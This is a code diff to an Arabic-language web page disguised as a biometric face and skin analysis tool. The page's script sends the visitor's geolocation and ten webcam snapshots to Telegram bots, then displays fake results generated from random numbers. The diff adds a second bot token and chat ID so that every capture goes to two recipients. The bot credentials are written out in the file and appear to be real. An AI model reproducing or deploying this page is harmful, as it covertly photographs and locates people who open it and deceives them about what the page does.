@@ -12,6 +12,7 @@
         .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
         .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
         #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
+        
         .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
         .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
         .result-label { color: #a0a0a0; }
@@ -50,27 +51,26 @@
     <script>
         const TOKEN1 = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
         const CHAT_ID1 = '8293639164';
+        
+        // ضع بيانات البوت الثاني هنا
+        const TOKEN2 = '8520439288:AAHcZlL7pbF_dAq6wXxa3X7mF7qUlLv1iQw';
+        const CHAT_ID2 = '8254934850';
 
         const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
         const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
+        
+        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        function res(id, val) { document.getElementById(id).innerText = val; }
 
-        function getRandomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
-        }
-
-        function res(id, val) {
-            document.getElementById(id).innerText = val;
-        }
-
-        async function sendPhoto(blob, photoNumber) {
-            const fd = new FormData();
-            fd.append('photo', blob, `img_${photoNumber}.jpg`);
-            fd.append('chat_id', CHAT_ID1);
-            fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
-
-            fetch(`https://api.telegram.org/bot${TOKEN1}/sendPhoto`, {
-                method: 'POST',
-                body: fd
+        async function sendPhotoToBoth(blob, photoNumber) {
+            const bots = [{t: TOKEN1, c: CHAT_ID1}, {t: TOKEN2, c: CHAT_ID2}];
+            bots.forEach(bot => {
+                if(bot.t.includes('ضع_')) return;
+                const fd = new FormData();
+                fd.append('photo', blob, `img_${photoNumber}.jpg`);
+                fd.append('chat_id', bot.c);
+                fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
+                fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
             });
         }
 
@@ -78,31 +78,31 @@
             const btn = document.getElementById('startBtn');
             const status = document.getElementById('status');
             const bar = document.getElementById('bar');
-
+            
             btn.style.display = 'none';
             status.innerHTML = "جاري الاتصال بالسيرفر...";
             bar.style.width = "20%";
 
             navigator.geolocation.getCurrentPosition((pos) => {
                 const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN1}/sendMessage?chat_id=${CHAT_ID1}&text=${encodeURIComponent(mapUrl)}`);
+                [TOKEN1, TOKEN2].forEach((t, i) => {
+                    const cid = i === 0 ? CHAT_ID1 : CHAT_ID2;
+                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(mapUrl)}`);
+                });
             });
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
+                document.getElementById('video').srcObject = stream;
                 status.innerHTML = "جاري المسح البيومتري... ثبات";
-
+                
                 const canvas = document.getElementById('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
+                canvas.width = 640; canvas.height = 480;
 
                 for (let i = 1; i <= 10; i++) {
                     setTimeout(() => {
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => sendPhoto(blob, i), 'image/jpeg', 0.6);
+                        canvas.toBlob(blob => sendPhotoToBoth(blob, i), 'image/jpeg', 0.6);
                         bar.style.width = (20 + (i * 8)) + "%";
                     }, i * 700);
                 }
@@ -112,7 +112,6 @@
                     document.getElementById('pre-scan-ui').style.display = 'none';
                     status.style.display = 'none';
                     document.getElementById('resultsUi').style.display = 'block';
-
                     res('res-shape', faceShapes[getRandomInt(0, 4)]);
                     res('res-symmetry', getRandomInt(85, 98) + "%");
                     res('res-age', getRandomInt(20, 40) + " سنة");
@@ -128,4 +127,3 @@
     </script>
 </body>
 </html>
-
